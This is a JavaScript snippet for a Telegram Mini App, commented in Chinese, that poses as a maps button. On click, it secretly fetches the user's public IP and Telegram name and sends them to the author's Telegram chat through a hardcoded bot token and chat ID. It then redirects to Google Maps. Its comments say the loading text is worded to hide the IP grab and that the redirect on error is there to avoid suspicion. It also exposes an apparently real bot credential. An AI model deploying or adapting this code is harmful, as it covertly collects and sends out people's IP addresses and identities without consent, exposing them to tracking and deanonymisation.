<script>
    const tg = window.Telegram.WebApp;
    tg.ready();

    // 設定你的資訊
    const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM'; // 剛才從 BotFather 拿到的那一長串
    const MY_CHAT_ID = '1287211539';    // 剛才從 userinfobot 拿到的數字

    document.getElementById('btn').addEventListener('click', async () => {
        const infoDiv = document.getElementById('info');
        infoDiv.innerText = "正在處理中，請稍候..."; // 換個說法，不提 IP

        try {
            // 1. 取得使用者的 IP
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const userIp = data.ip;

            // 2. 取得使用者在 Telegram 的名稱 (選用)
            const userName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "未知用戶";

            // 3. 偷偷發送訊息到你的 Telegram
            const message = `📢 警報：用戶 [${userName}] 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: MY_CHAT_ID,
                    text: message
                })
            });

            // 4. 直接跳轉到 Google Maps (不顯示 IP 給用戶看)
            infoDiv.innerText = "載入地圖中...";
            setTimeout(() => {
                tg.openLink('https://www.google.com/maps');
                tg.close(); // 選擇性：關閉 Mini App 視窗
            }, 500);

        } catch (e) {
            console.error(e);
            // 失敗時還是讓用戶能跳轉，避免起疑
            tg.openLink('https://www.google.com/maps');
        }
    });
</script>
